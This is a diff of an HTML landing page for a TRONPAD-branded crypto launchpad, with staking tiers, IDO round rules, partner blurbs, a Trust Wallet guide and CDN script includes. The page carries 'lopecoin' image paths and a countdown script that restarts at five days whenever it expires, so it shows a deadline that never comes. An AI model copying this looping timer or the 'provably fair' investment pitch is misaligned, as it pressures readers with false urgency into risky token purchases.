+                <div class="col-md-4"><img src="./lopecoin/img/bg.png" class="w-100"></div>
+                <div class="col-md-8 ps-md-5 font-18 text-start">
+                  <p></p>
+                  <p><b class="white-d">10%</b> for lottery Tiers (Earth tiers)</p>
+                  <p><b class="white-d">90%</b> for guaranteed allocation Tiers (higher tiers)</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="pp-home-how-it-work-content pp-section-body">
+        <div class="container">
+          <div class="text-center mb-5 mt-5">
+            <h3 class="text-uppercase"><b>LOTTERY TIER</b></h3>
+          </div>
+          <div class="row mb-3 justify-content-center">
+            <div class="col-md-4" data-aos="fade-up" data-aos-delay="100">
+              <div class="pricing-table text-center">
+                <p class="bold price-header"><b class="text-warning">Earth</b></p>
+                <hr>
+                <p class="light thin mb-0">Staking Requirement</p>
+                <p class="price" style="line-height: 1.3;"><span class="bold">5,000</span><br><i class="font-16">1
+                    lottery ticket</i></p>
+                <p class="price" style="line-height: 1.3;"><span class="bold">10,000</span><br><i class="font-16">2
+                    lottery ticket</i></p>
+                <p class="price" style="line-height: 1.3;"><span class="bold">15,000</span><br><i class="font-16">3
+                    lottery ticket</i></p>
+                <p class="light thin mb-0">Staking Length Required</p>
+                <p class="value price"><span class="font-18">3 hours before allocation round opens</span></p>
+                <hr><a
+                  href="https://bscpad.medium.com/tronpad-tronpad-the-official-launchpad-of-the-tron-blockchain-8e0c7654e0ae"
+                  target="blank" class="btn btn-primary btn-lg">Learn more</a>
+              </div>
+            </div>
+          </div>
+          <div class="text-center mb-5 mt-5">
+            <h3 class="text-uppercase"><b>GUARANTEED ALLOCATION TIERS</b></h3>
+          </div>
+          <div class="row mb-3 justify-content-center">
+            <div class="col-md-4" data-aos="fade-up" data-aos-delay="100">
+              <div class="pricing-table text-center">
+                <p class="bold price-header"><b class="text-warning">Moon</b></p>
+                <hr>
+                <p class="light thin mb-0">Staking Requirement</p>
+                <p class="bold price"><span>50,000</span></p>
+                <p class="value price"><span class="font-18">1 Guaranteed Allocation</span></p>
+                <p class="light thin mb-0">Staking Length Required</p>
+                <p class="value price"><span class="font-18">3 hours before allocation round opens</span></p>
+                <p class="light thin mb-0">Pool Weight</p>
+                <p class="value price"><span class="font-18">10</span></p>
+                <hr><a
+                  href="https://bscpad.medium.com/tronpad-tronpad-the-official-launchpad-of-the-tron-blockchain-8e0c7654e0ae"
+                  target="blank" class="btn btn-primary btn-lg">Learn more</a>
+              </div>
+            </div>
+            <div class="col-md-4" data-aos="fade-up" data-aos-delay="100">
+              <div class="pricing-table text-center">
+                <p class="bold price-header"><b class="text-warning">Mars</b></p>
+                <hr>
+                <p class="light thin mb-0">Staking Requirement</p>
+                <p class="bold price"><span>200,000</span></p>
+                <p class="value price"><span class="font-18">1 Guaranteed Allocation</span></p>
+                <p class="light thin mb-0">Staking Length Required</p>
+                <p class="value price"><span class="font-18">3 hours before allocation round opens</span></p>
+                <p class="light thin mb-0">Pool Weight</p>
+                <p class="value price"><span class="font-18">45</span></p>
+                <hr><a
+                  href="https://bscpad.medium.com/tronpad-tronpad-the-official-launchpad-of-the-tron-blockchain-8e0c7654e0ae"
+                  target="blank" class="btn btn-primary btn-lg">Learn more</a>
+              </div>
+            </div>
+            <div class="col-md-4" data-aos="fade-up" data-aos-delay="100">
+              <div class="pricing-table text-center">
+                <p class="bold price-header"><b class="text-warning">Sun</b></p>
+                <hr>
+                <p class="light thin mb-0">Staking Requirement</p>
+                <p class="bold price"><span>500,000</span></p>
+                <p class="value price"><span class="font-18">1 Guaranteed Allocation</span></p>
+                <p class="light thin mb-0">Staking Length Required</p>
+                <p class="value price"><span class="font-18">3 hours before allocation round opens</span></p>
+                <p class="light thin mb-0">Pool Weight</p>
+                <p class="value price"><span class="font-18">70 + Private Allocations</span></p>
+                <hr><a
+                  href="https://bscpad.medium.com/tronpad-tronpad-the-official-launchpad-of-the-tron-blockchain-8e0c7654e0ae"
+                  target="blank" class="btn btn-primary btn-lg">Learn more</a>
+              </div>
+            </div>
+          </div>
+          <p class="text-center mb-5">Lottery winners will be announced prior to the IDO and can purchase their
+            allocation when IDO opens. All other guaranteed tiers users can purchase their guaranteed allocation when
+            the IDO opens too.All allocations will need to be purchased in the allotted time or it will be forfeited and
+            offered as first come first served.</p>
+          <div class="text-center mb-5 mt-5">
+            <h3 class="text-uppercase"><b>Round 2 - FCFS ROUND</b></h3>
+          </div>
+          <div class="row mb-5 align-items-center">
+            <div class="col-md-6" data-aos="fade-up" data-aos-delay="100"><img src="./lopecoin/img/gfx-e.png" alt=""
+                class="w-100"></div>
+            <div class="col-md-6" data-aos="fade-up" data-aos-delay="200">
+              <p>In round 2, the unsold tokens from the first round are made available on a FCFS basis, only to
+                guaranteed tiers (Moon and above). These members can purchase an additional amount that is determined by
+                a tier-based formula. This round is open until all tokens are sold, typically lasting for only a few
+                minutes. After all the tokens are sold, the IDO is concluded.</p>
+              <p class="mt-3"><b class="how-it-work-heading">We will be collecting both data and feedback on the IDO
+                  structure in order to optimize the system over time as well as taking into consideration community
+                  feedback and potential DAO proposals.</b></p>
+              <p>Our system is a predictable and provably fair system giving our users the proper incentives to
+                accumulate and hold tokens and support each and every project launched. Over time, we will tweak
+                weights, add new tiers and change other parameters as necessary to keep the system functional,
+                competitive and rewarding for all community members.</p>
+              <p>$TRONPAD is the next evolution of blockchain launchpads solving the fundamental flaws that plague
+                existing launchpads. This platform benefits all holders of the token and allows for fair launches giving
+                traders of all sizes the opportunity to invest in the best upcoming projects launching on the Tron
+                network.</p>
+            </div>
+          </div>
+        </div>
       </div>
     </div>
 
-    <script>
-      function startCountdown(duration, display) {
-        let timer = duration,
-          days,
-          hours,
-          minutes,
-          seconds;
-        setInterval(function () {
-          days = parseInt(timer / 86400, 10);
-          hours = parseInt((timer % 86400) / 3600, 10);
-          minutes = parseInt((timer % 3600) / 60, 10);
-          seconds = parseInt(timer % 60, 10);
+    <div class="pp-home-advisors pp-section py-5 z-10 text-white">
+      <div class="container">
+        <div class="row justify-content-center text-center">
+          <div class="col-lg-12">
+            <div class="section-head">
+              <h2 class="title title-xl" data-aos="fade-up" data-aos-delay="100" title="PARTNER">STRATEGIC PARTNER</h2>
+            </div>
+          </div>
+          <div class="col-lg-12 mb-5">
+            <div class="pp-card-legal-partner darkmode">
+              <div class="mb-4"><img width="130" class="dark-show mx-auto" src="./lopecoin/img/tron-logo-d.png" alt=""></div>
+              <p class="mb-0">"The BSCPad team is very strong and knowledgeable, they consist of some of the top players
+                in the space. We are looking forward to taking this collaboration to new heights", Justin Sun, Founder
+                of TRON and CEO of BitTorrent.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
 
-          days = days < 10 ? "0" + days : days;
-          hours = hours < 10 ? "0" + hours : hours;
-          minutes = minutes < 10 ? "0" + minutes : minutes;
-          seconds = seconds < 10 ? "0" + seconds : seconds;
 
-          display.innerHTML = `
+    <div class="pp-home-advisors pp-section py-3 z-10 text-white" id="advisor">
+      <div class="container">
+        <div class="row justify-content-center text-center">
+          <div class="col-lg-12">
+            <div class="section-head">
+              <h2 class="title title-xl" data-aos="fade-up" data-aos-delay="100" title="PARTNER">INCUBATOR AND
+                INVESTMENT PARTNER</h2>
+            </div>
+          </div>
+          <div class="col-lg-12 mb-5 mt-4">
+            <div class="pp-card-legal-partner darkmode">
+              <div class="mb-4"><img width="230" class="dark-show mx-auto" src="/images/bluzilla_logo.png" alt=""><img
+                  width="230" class="light-show mx-auto" src="/images/bluzilla_logo-df.png" alt=""></div>
+              <div>
+                <p>We specialize in taking your innovative and new idea from concept to completion through our market
+                  leading advisory, investment, development, influencer marketing and legal support services.</p>
+                <p>We are the only VC with in house developers, designers, marketers, influencers, traders, legal and
+                  launch pads.</p>
+                <p>We help by not only bringing capital and partners, but every aspect of your project from tokenomics
+                  to post launch marking.</p>
+                <div class="pt-3"><a href="https://bluezilla.vc/" target="_blank" class="btn btn-outline-primary">Learn
+                    more</a></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="pp-home-advisors-content pp-section-body">
+        <div class="container"></div>
+      </div>
+    </div>
+
+    <div class="modal fade in z-10 text-white darkmode" id="helpModal" tabindex="-1" aria-labelledby="helpModalLabel">
+      <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-content modal-content modal-help">
+          <div class="modal-header"><button type="button" class="btn-close" data-bs-dismiss="modal"
+              aria-label="Close"></button></div>
+          <div class="modal-body">
+            <div class="d-flex mb-3"><a class="btn btn-info me-2 w-100 text-white text-center"
+                href="https://link.trustwallet.com/open_url?coin_id=56&amp;url=https://tronpad.network/">Open with <img
+                  src="/images/trust_platform.png" width="30px" class="me-2" alt="tronpad"></a></div>
+            <h2 class="text-danger">How to Set Up and Use Trust Wallet for TRONPAD.NETWORK</h2>
+            <h5 class="mt-3">Setting up your wallet for Tron</h5>
+            <ul class="ps-0" style="list-style: none;">
+              <li>1). Download Trust Wallet. If you already have Trust Wallet, make sure your app is up to date.</li>
+              <li>2). Complete <a href="https://community.trustwallet.com/t/how-to-create-a-multi-coin-wallet/41"
+                  target="_blank">basic setup of a multi-coin wallet</a>. Remember to save your backup phrases.</li>
+              <li>3). Go to your Smart Chain wallet and press receive to find your address</li>
+              <li>4). That’s it! You’re ready to start using Tron</li>
+            </ul>
+            <h5 class="mt-4">Using TRONPAD.NETWORK in Trust Wallet</h5>
+            <ul class="ps-0" style="list-style: none;">
+              <li>5). For this part, iOS users will need the Dapp browser. Android users have the Dapp browser by
+                default.</li>
+              <li>6). Once you’ve topped up your wallet, open the Dapp browser by pressing on the four squares at the
+                bottom of the app.</li>
+            </ul>
+            <p class="text-center"><img class="mx-auto" src="/images/help-1.png" alt="pscpad" style="max-width: 97%;">
+            </p>
+            <ul class="ps-0" style="list-style: none;">
+              <li>7). Input <b>tronpad.network</b></li>
+              <li>8). Change network to Tron</li>
+              <li>9). Use the Dapp and have fun!</li>
+            </ul>
+            <h5 class="mt-5">Enable DApp Browser on Trust Wallet (iOS version)</h5>
+            <ul class="ps-0" style="list-style: none;">
+              <li>
+                <p>&nbsp;<b>trust.//browser_enable</b>, then tap on&nbsp;<b>Go</b></p>
+                <p><img class="mx-auto" src="/images/help-2.png" alt="" style="max-width: 97%;"></p>
+              </li>
+              <li>
+                <p>2). A prompt will appear that will ask if you want to&nbsp;<b>Open this page in “Trust”?</b>, tap
+                  on&nbsp;<b>Open</b></p>
+                <p><img class="mx-auto" src="/images/help-3.png" alt="" style="max-width: 97%;"></p>
+                <p>The&nbsp;<b>Trust Wallet</b>&nbsp;app will launch and the&nbsp;<b>DApp&nbsp;browser</b>&nbsp;will be
+                  enabled</p>
+                <p><img class="mx-auto" src="/images/help-4.png" alt="" style="max-width: 97%;"></p>
+              </li>
+            </ul>
+            <div class="d-flex mt-4"><a class="btn btn-info me-2 w-100 text-white text-center"
+                href="https://link.trustwallet.com/open_url?coin_id=56&amp;url=https://tronpad.network/">Open with <img
+                  src="/images/trust_platform.png" width="30px" class="me-2"></a></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+
+    <div class="pp-home-contact pp-section pb-5 pt-5" id="contact">
+      <div class="container">
+        <div class="row justify-content-center text-center">
+          <div class="col-lg-6">
+            <div class="section-head">
+              <h2 class="title title-xl" data-aos="fade-up" data-aos-delay="100" title="CONTACT US">CONTACT</h2>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="pp-home-contact-content pp-section-body mt-5">
+        <div class="container">
+          <div class="row justify-content-center align-items-center gutter-vr-50px">
+            <div class="col-lg-5 text-center order-lg-first">
+              <div class="nk-block-contact nk-block-contact-s1" data-aos="fade-up" data-aos-delay="100">
+                <ul class="contact-list ps-1">
+                  <li data-aos="fade-up" data-aos-delay="300"><em class="contact-icon fas fa-headset"></em>
+                    <div class="contact-text"><a href="https://bluezilla.jitbit.com/helpdesk/"
+                        target="_blank"><span>Contact Support</span></a></div>
+                  </li>
+                  <li data-aos="fade-up" data-aos-delay="400"><em class="contact-icon fab fa-twitter"></em>
+                    <div class="contact-text"><a href="https://twitter.com/Tronpadofficial" target="_blank">
+                        <span>Follow our Twitter</span></a></div>
+                  </li>
+                  <li data-aos="fade-up" data-aos-delay="500"><em class="contact-icon fas fa-globe"></em>
+                    <div class="contact-text"><span>www.tronpad.network</span></div>
+                  </li>
+                </ul>
+                <div class="nk-circle-animation nk-df-center white small"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function startCountdown(duration, display) {
+      let timer = duration,
+        days,
+        hours,
+        minutes,
+        seconds;
+      setInterval(function () {
+        days = parseInt(timer / 86400, 10);
+        hours = parseInt((timer % 86400) / 3600, 10);
+        minutes = parseInt((timer % 3600) / 60, 10);
+        seconds = parseInt(timer % 60, 10);
+
+        days = days < 10 ? "0" + days : days;
+        hours = hours < 10 ? "0" + hours : hours;
+        minutes = minutes < 10 ? "0" + minutes : minutes;
+        seconds = seconds < 10 ? "0" + seconds : seconds;
+
+        display.innerHTML = `
           <strong>${days}</strong>:<strong>${hours}</strong>:<strong>${minutes}</strong>:<strong>${seconds}</strong>
         `;
 
-          if (--timer < 0) {
-            timer = duration;
-          }
-        }, 1000);
-      }
+        if (--timer < 0) {
+          timer = duration;
+        }
+      }, 1000);
+    }
 
-      window.onload = function () {
-        const countdownElement = document.getElementById("countdown");
-        const duration = 86400 * 5; // countdown duration in seconds (5 days)
-        startCountdown(duration, countdownElement);
-      };
-    </script>
-    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
-    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
-  </body>
+    window.onload = function () {
+      const countdownElement = document.getElementById("countdown");
+      const duration = 86400 * 5; // countdown duration in seconds (5 days)
+      startCountdown(duration, countdownElement);
+    };
+  </script>
+
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/5.3.0/js/bootstrap.min.js"></script>
+</body>
+
 </html>
